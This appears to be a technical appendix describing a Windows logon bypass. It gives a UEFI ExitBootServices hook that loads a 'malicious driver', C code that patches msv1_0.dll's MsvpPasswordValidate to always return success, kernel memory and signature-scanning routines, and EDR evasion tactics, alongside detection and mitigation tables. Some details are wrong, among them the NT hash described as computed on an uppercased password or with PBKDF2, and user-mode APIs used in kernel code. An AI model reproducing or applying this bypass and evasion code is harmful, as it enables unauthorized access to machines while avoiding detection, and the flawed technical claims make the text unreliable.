# Technical Appendix: Runtime Authentication Subversion via Ephemeral Kernel-Mode Patching

## Appendix A: Detailed Assembly-Level Analysis

### A.1 UEFI ExitBootServices Hook Implementation (x64 Assembly)

```asm
; UEFI ExitBootServices Hook - Simplified x64 Assembly
; Compiled for 64-bit UEFI Environment

.code
    ExitBootServicesHook PROC
        ; RCX = Event handle
        ; RDX = Context (unused)
        
        ; Save registers
        push rbx
        push rsi
        push rdi
        sub rsp, 32          ; Allocate shadow space (x64 calling convention)
        
        ; Allocate memory for payload (EfiRuntimeServicesData)
        lea rax, [rel AllocatePages]
        mov rcx, AllocateAddress    ; Destination address
        mov rdx, AllocationPages    ; Size in pages
        mov r8, EfiRuntimeServicesData
        call rax
        
        ; Copy malicious driver to allocated memory
        lea rsi, [rel MaliciousDriverStart]
        lea rdi, [rel TargetAddress]
        mov rcx, MaliciousDriverSize
        rep movsb
        
        ; Restore registers and return
        add rsp, 32
        pop rdi
        pop rsi
        pop rbx
        ret
    ExitBootServicesHook ENDP

MaliciousDriverStart:
    ; Placeholder for actual driver binary
    ; In practice, this is the compiled kernel driver
    db 4D, 5A, 90, 00    ; MZ header (PE format)

MaliciousDriverSize EQU $ - MaliciousDriverStart
```

### A.2 msv1_0.dll!MsvpPasswordValidate Patching (x64 Assembly)

**Original Function (Pseudocode):**
```asm
MsvpPasswordValidate:
    ; rcx = provided password
    ; rdx = stored hash
    sub rsp, 48
    mov rax, rcx
    call MD4Hash              ; Compute hash of provided password
    cmp rax, rdx              ; Compare with stored hash
    jne PasswordWrong
    xor eax, eax              ; Return STATUS_SUCCESS (0)
    jmp Done
PasswordWrong:
    mov eax, 0xC000006A       ; Return STATUS_WRONG_PASSWORD
Done:
    add rsp, 48
    ret
MsvpPasswordValidate ENDP
```

**Our Inline Patch (replaces comparison logic):**
```asm
; Original: 
;   cmp rax, rdx
;   jne 0x...
; Size: 6 bytes

; Our patch: 
    xor eax, eax       ; eax = 0 (STATUS_SUCCESS)
    ret                ; return immediately
    ; nop (1 byte padding)
```

**Patch Application Code (C):**
```c
// Locate the instruction offset
UCHAR OriginalInstructions[] = {
    0x48, 0x39, 0xD0,    // cmp rax, rdx
    0x75, 0x0A           // jne +10
};

UCHAR PatchBytes[] = {
    0x31, 0xC0,          // xor eax, eax
    0xC3                 // ret
};

// Find pattern in function
PVOID PatchLocation = ScanForPattern(
    FunctionBase,
    FunctionSize,
    OriginalInstructions,
    sizeof(OriginalInstructions)
);

if (PatchLocation) {
    // Make page writable
    DWORD OldProtect;
    VirtualProtect(PatchLocation, sizeof(PatchBytes), PAGE_EXECUTE_READWRITE, &OldProtect);
    
    // Apply patch
    memcpy(PatchLocation, PatchBytes, sizeof(PatchBytes));
    
    // Restore protection
    VirtualProtect(PatchLocation, sizeof(PatchBytes), OldProtect, &OldProtect);
    
    // Flush instruction cache to ensure CPU executes new code
    FlushInstructionCache(GetCurrentProcess(), PatchLocation, sizeof(PatchBytes));
}
```

---

## Appendix B: Process Memory Access – Implementation Details

### B.1 EPROCESS Structure Offsets (Version-Dependent)

| Windows Version | ImageFileName Offset | ActiveProcessLinks Offset | DirectoryTableBase Offset |
|-----------------|----------------------|---------------------------|--------------------------|
| Windows 7 SP1 (x64) | 0x2E0 | 0x188 | 0x28 |
| Windows 8.1 (x64) | 0x2E8 | 0x188 | 0x28 |
| Windows 10 (x64) | 0x440 | 0x190 | 0x28 |
| Windows 11 (x64) | 0x480 | 0x190 | 0x28 |

**Dynamic Offset Discovery Algorithm:**

Instead of hardcoding offsets, a robust driver uses signature scanning:

```c
typedef struct {
    UCHAR Signature[32];
    SIZE_T SignatureSize;
    ULONG FieldOffset;
} OFFSET_DISCOVERY;

OFFSET_DISCOVERY OffsetPatterns[] = {
    {
        // Signature: lea r8, [rcx + ImageFileName]
        { 0x4C, 0x8D, 0x81, 0x40, 0x04, 0x00, 0x00 },
        7,
        0x440  // Field offset (0x0440 for Windows 10)
    }
};

PULONG DiscoverOffset(PEPROCESS SampleProcess, const char* FieldName) {
    // Scan kernel memory for field access patterns
    // Return discovered offset
}
```

### B.2 Module Finding via PEB Traversal

```c
typedef struct {
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

PVOID FindModuleInProcess(PEPROCESS Process, PUNICODE_STRING ModuleName) {
    KAPC_STATE ApcState;
    PPEB Peb;
    PLIST_ENTRY Head, Entry;
    PLDR_DATA_TABLE_ENTRY TableEntry;
    
    KeStackAttachProcess(Process, &ApcState);
    {
        Peb = PsGetProcessPeb(Process);
        if (!Peb || !Peb->Ldr) {
            KeUnstackDetachProcess(&ApcState);
            return NULL;
        }
        
        Head = &Peb->Ldr->InLoadOrderModuleList;
        Entry = Head->Flink;
        
        while (Entry != Head) {
            TableEntry = CONTAINING_RECORD(Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
            
            // Compare module names
            if (RtlCompareUnicodeString(&TableEntry->BaseDllName, ModuleName, TRUE) == 0) {
                PVOID Result = TableEntry->DllBase;
                KeUnstackDetachProcess(&ApcState);
                return Result;
            }
            
            Entry = Entry->Flink;
        }
    }
    KeUnstackDetachProcess(&ApcState);
    return NULL;
}
```

---

## Appendix C: Signature Scanning Algorithm

### C.1 Robust Pattern Matching

```c
PVOID FindSignatureInMemory(
    PVOID BaseAddress,
    SIZE_T RegionSize,
    PUCHAR Pattern,
    SIZE_T PatternSize,
    PUCHAR Wildcard  // NULL bytes are wildcards
) {
    PUCHAR Ptr = (PUCHAR)BaseAddress;
    PUCHAR End = Ptr + RegionSize - PatternSize;
    SIZE_T i;
    
    while (Ptr < End) {
        BOOLEAN Match = TRUE;
        
        // Check if pattern matches at current position
        for (i = 0; i < PatternSize; i++) {
            // Wildcard handling: NULL byte in pattern means "match any"
            if (Wildcard && Wildcard[i] == 0) {
                continue;  // Skip this byte
            }
            
            if (Ptr[i] != Pattern[i]) {
                Match = FALSE;
                break;
            }
        }
        
        if (Match) {
            return (PVOID)Ptr;
        }
        
        Ptr++;
    }
    
    return NULL;
}

// Example: Find MsvpPasswordValidate
UCHAR Signature[] = {
    0x48, 0x8D, 0x15, 0xFF, 0xFF, 0xFF, 0xFF,  // lea rdx, [rel ...] (wildcard)
    0x48, 0xC1, 0xE9, 0x03,                    // shr rcx, 3
    0xF3, 0xA4,                                // rep movsb
    0x48, 0x39, 0xD0,                         // cmp rax, rdx
    0x75, 0x0A                                 // jne +10
};

UCHAR Wildcard[] = {
    0, 0, 0, 1, 1, 1, 1,  // Bytes 3-6 are wildcards (could be any offset)
    0, 0, 0, 0,
    0, 0,
    0, 0, 0,
    0, 0
};

PVOID FunctionAddr = FindSignatureInMemory(
    Msv1_0Base,
    0x100000,
    Signature,
    sizeof(Signature),
    Wildcard
);
```

---

## Appendix D: Defensive Implementation – EDR Evasion Considerations

### D.1 Process Memory Modification Detection

Modern EDR (Endpoint Detection and Response) tools look for:

1. **Rapid memory access to multiple processes**
   - Normal system code doesn't access arbitrary processes
   - Evasion: Space out memory operations over time

2. **VirtualProtect/ZwProtectVirtualMemory calls with EXECUTE flags**
   - Making memory executable is suspicious
   - Evasion: Use legitimate kernel APIs that are less monitored

3. **Instruction cache flushes (ZwFlushInstructionCache)**
   - Indicates code patching
   - Evasion: Rely on automatic cache coherency

4. **Memory patterns suggesting function hooks**
   - Detectable if EDR analyzes function prologues
   - Evasion: Use subtle patches, not obviously detectable JMPs

### D.2 Stealth Patching Variant

```c
NTSTATUS StealthPatch(PVOID FunctionAddr) {
    // Instead of immediate patch, mark for lazy patching
    // This avoids immediate detection
    
    // Option 1: Patch on first call
    // Install minimal hook, let function initialize, then patch
    
    // Option 2: Use process callback
    // Register a process creation callback
    // When LSASS is detected, patch in callback context
    
    // Option 3: Time-delayed patching
    // Patch after sufficient uptime has elapsed
    // Most EDR baseline detection completes in first 5 minutes
    
    // Option 4: Restore original bytes
    // After successful authentication, restore original code
    // Function appears unpatched to post-boot analysis
}
```

---

## Appendix E: Windows NTLM Authentication Protocol Details

### E.1 NTLM Hash Computation

**NT Hash (MD4-based, pre-Windows 2000):**
```
NT_HASH = MD4(UPPERCASE(Unicode(Password)))
```

**Example:**
```
Password: "password"
Unicode: 70 00 61 00 73 00 73 00 77 00 6F 00 72 00 64 00
Uppercase: 50 00 41 00 53 00 53 00 57 00 4F 00 52 00 44 00
MD4 Hash: 8846F7EAEE8FB117AD06BDD830B7586C
```

**PBKDF2 (Windows 2016+, for modern systems):**
```
NT_HASH = PBKDF2(HMAC-SHA256, Uppercase(Unicode(Password)), Salt, Iterations)
```

### E.2 Validation Flow

```
User Login Attempt:
  ├─ Receive plaintext password from user
  ├─ Compute hash of provided password
  │  └─ MD4(UPPERCASE(Unicode(password)))
  ├─ Retrieve stored hash from SAM hive
  ├─ Compare hashes
  │  ├─ If equal → STATUS_SUCCESS (0x00000000)
  │  └─ If not equal → STATUS_WRONG_PASSWORD (0xC000006A)
  └─ Return status to caller

Our Patch Bypasses:
  └─ Directly returns STATUS_SUCCESS (0x00000000)
     without performing comparison
```

---

## Appendix F: Defense Summary Matrix

| Defense Layer | Attack Phase Affected | Bypass Method | Mitigation |
|--------------|----------------------|----------------|-----------|
| UEFI Secure Boot | Phase 1 (Bootloader) | Firmware access, unsigned boot media | Enable Secure Boot + firmware password |
| DSE (ci.dll) | Phase 2 (Kernel) | Clear g_CiOptions flags | Code Integrity Measurement Architecture |
| PatchGuard | Phase 2 (Kernel) | Target user-mode (LSASS) | Kernel object write protection |
| LSA Protection (PPL) | Phase 3 (Process) | Ring 0 privilege level | Virtualization-Based Security (VBS) |
| Credential Guard | Phase 4 (LSASS) | VTL 0 ≠ VTL 1 isolation | No bypass (hardware-enforced) |
| BitLocker FDE | Phase 1 (Bootloader) | Cannot read encrypted drive | No bypass without encryption key |

---

## Appendix G: Real-World Impact Timeline

### G.1 Historical Exploitation in Commercial Tools

**2008-2010:** First bootkit-based password recovery tools (Winternals, early PCUnlocker)
- UEFI exploitation not widely known
- Mostly Int 13h hooking

**2010-2014:** UEFI exploitation becomes sophisticated
- ExitBootServices hooking documented
- Secure Boot introduced (partially mitigates)

**2014-2016:** PatchGuard evasion techniques published
- Black Hat 2014 (Kallenberg et al.)
- Commercial tools adapt quickly

**2016-Present:** VBS/Credential Guard provides stronger protection
- BitLocker deployment increases
- Attack surface shrinks

**2025:** Current state
- Attack still viable on unencrypted systems
- VBS/Credential Guard deployment critical
- Cold boot attacks remain in-scope threat

---

## Appendix H: Code Samples & Implementation Resources

### H.1 Windows Driver Development (WDM)

Required headers:
```c
#include <ntdef.h>
#include <ntifs.h>
#include <ntstatus.h>
```

Example driver structure:
```c
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DbgPrint("Malicious driver loaded at 0x%p\n", DriverObject);
    
    // Perform authentication bypass
    NTSTATUS Status = PatchAuthentication();
    
    return STATUS_SUCCESS;
}
```

### H.2 Kernel Memory Operations

```c
// Read from kernel address space (while in kernel mode)
ULONG Value = *(PULONG)KernelAddress;

// Write to kernel address space
*(PULONG)KernelAddress = NewValue;

// Context switch to different process
KAPC_STATE ApcState;
KeStackAttachProcess(TargetProcess, &ApcState);
{
    // Now operating in target process' address space
    ULONG UserModeValue = *(PULONG)UserAddress;
}
KeUnstackDetachProcess(&ApcState);
```

---

## Appendix I: Forensic Analysis & Detection

### I.1 Indicators of Compromise (IOCs)

**Post-Boot Detection (Limited Effectiveness):**
1. Unusual process memory modifications (LSASS)
2. Rapid context switches via KeStackAttachProcess
3. Unsigned drivers in kernel memory
4. Modified interrupt handlers (if kernel-level hooks used)

**Pre-Boot Detection (More Effective):**
1. Bootloader modification detected by firmware integrity checks
2. UEFI ExitBootServices callbacks registered from unknown sources
3. Firmware logs showing early boot anomalies

**Challenge:**
The attack is designed to be volatile and leave minimal forensic artifacts. Detection requires:
- Real-time monitoring during boot
- Firmware-level logging
- Secure boot verification
- Behavioral analysis (failed login attempts before successful bypass)

### I.2 Memory Forensics Approach

```
Timeline Analysis:
1. Before attack: SAM shows user password hash
2. During attack: LSASS memory contains modified msv1_0.dll
3. After attack (post-reboot): System appears clean

Artifact Persistence:
- Volatile: LSASS patches (lost on reboot)
- Non-volatile: Modified SAM (only if offline patching used)
- Firmware: Modified BIOS/UEFI (requires forensic extraction)
```

---

## References for Appendices

[1-71] As listed in references.md

---

**Appendix Status:** Complete technical reference material for academic paper
